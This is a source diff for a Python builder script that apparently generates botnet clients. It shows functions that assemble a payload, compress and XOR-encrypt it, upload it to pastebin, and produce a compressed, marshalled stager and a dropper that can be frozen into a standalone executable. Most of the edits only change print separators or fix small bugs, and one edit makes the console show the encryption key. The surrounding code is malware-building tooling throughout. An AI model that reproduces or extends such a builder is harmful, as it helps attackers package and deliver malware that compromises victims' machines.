@@ -195,9 +195,9 @@ def _update(input, output, task=None):
     util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')
 
 def _modules(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display('Modules', color='reset', style='bright')
-    util.display("\tAdding modules... ", color='reset', style='normal', end=',')
+    util.display("\tAdding modules... ", color='reset', style='normal', end=' ')
  
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
@@ -221,15 +221,15 @@ def _modules(options, **kwargs):
     return modules
 
 def _imports(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Imports", color='reset', style='bright')
  
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
  
-    util.display("\tAdding imports...", color='reset', style='normal', end=',')
+    util.display("\tAdding imports...", color='reset', style='normal', end=' ')
  
     globals()['__load__'] = threading.Event()
-    globals()['__spin__'] = _spinner(__load__)
+    globals()['__spin__'] = _spinner(globals()['__load__'])
  
     imports  = set()
 
@@ -277,7 +277,7 @@ def _hidden(options, **kwargs):
     return list(hidden)
 
 def _payload(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Payload", color='reset', style='bright')
 
     assert 'var' in kwargs, "missing keyword argument 'var'"
@@ -293,7 +293,7 @@ def _payload(options, **kwargs):
 
  #   if options.obfuscate:
  #       __load__= threading.Event()
- #       util.display("\tObfuscating payload... ", color='reset', style='normal', end=',')
+ #       util.display("\tObfuscating payload... ", color='reset', style='normal', end=' ')
  #       __spin__= _spinner(__load__)
  #       output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
  #       __load__.set()
@@ -301,7 +301,7 @@ def _payload(options, **kwargs):
  #       payload = output
 
     if options.compress:
-        util.display("\tCompressing payload... ", color='reset', style='normal', end=',')
+        util.display("\tCompressing payload... ", color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = generators.compress(payload)
@@ -311,7 +311,7 @@ def _payload(options, **kwargs):
 
     if options.encrypt:
         assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
-        util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
+        util.display("\tEncrypting payload... {}".format(kwargs['key']), color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output = security.encrypt_xor(payload, kwargs['key'])
@@ -319,7 +319,7 @@ def _payload(options, **kwargs):
         _update(payload, output, task='Encryption')
         payload = output
 
-    util.display("\tUploading payload... ", color='reset', style='normal', end=',')
+    util.display("\tUploading payload... ", color='reset', style='normal', end=' ')
 
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
@@ -348,7 +348,7 @@ def _payload(options, **kwargs):
     return url
 
 def _stager(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Stager", color='reset', style='bright')
 
     assert 'url' in kwargs, "missing keyword argument 'url'"
@@ -367,7 +367,7 @@ def _stager(options, **kwargs):
             util.log("Permission denied: unable to make directory './modules/stagers/'")
 
 #    if options.obfuscate:
-#        util.display("\tObfuscating stager... ", color='reset', style='normal', end=',')
+#        util.display("\tObfuscating stager... ", color='reset', style='normal', end=' ')
 #        __load__ = threading.Event()
 #        __spin__ = _spinner(__load__)
 #        output = generators.obfuscate(stager)
@@ -376,7 +376,7 @@ def _stager(options, **kwargs):
 #        stager = output
 
     if options.compress:
-        util.display("\tCompressing stager... ", color='reset', style='normal', end=',')
+        util.display("\tCompressing stager... ", color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         output  = base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))
@@ -384,13 +384,13 @@ def _stager(options, **kwargs):
         _update(stager, output, task='Compression')
         stager = output
 
-    util.display("\tUploading stager... ", color='reset', style='normal', end=',')
+    util.display("\tUploading stager... ", color='reset', style='normal', end=' ')
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
 
     if options.pastebin:
         assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
-        url = util.pastebin(stager, api_dev_key=options.pastebin)
+        url = util.pastebin(stager, api_key=options.pastebin)
     else:
         dirs = ['modules/stagers','byob/modules/stagers','byob/byob/modules/stagers']
         dirname = '.'
@@ -412,9 +412,9 @@ def _stager(options, **kwargs):
     return url
 
 def _dropper(options, **kwargs):
-    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=' ')
     util.display("Dropper", color='reset', style='bright')
-    util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
+    util.display('\tWriting dropper... ', color='reset', style='normal', end=' ')
     
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
@@ -428,7 +428,7 @@ def _dropper(options, **kwargs):
         fp.write(dropper)
 
     if options.freeze:
-        util.display('\tCompiling executable... ', color='reset', style='normal', end=',')
+        util.display('\tCompiling executable... ', color='reset', style='normal', end=' ')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
         name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
@@ -446,6 +446,7 @@ def _spinner(flag):
         flag.wait(0.2)
         sys.stdout.write('\b')
         sys.stdout.flush()
+    return 0
 
 if __name__ == '__main__':
     main()
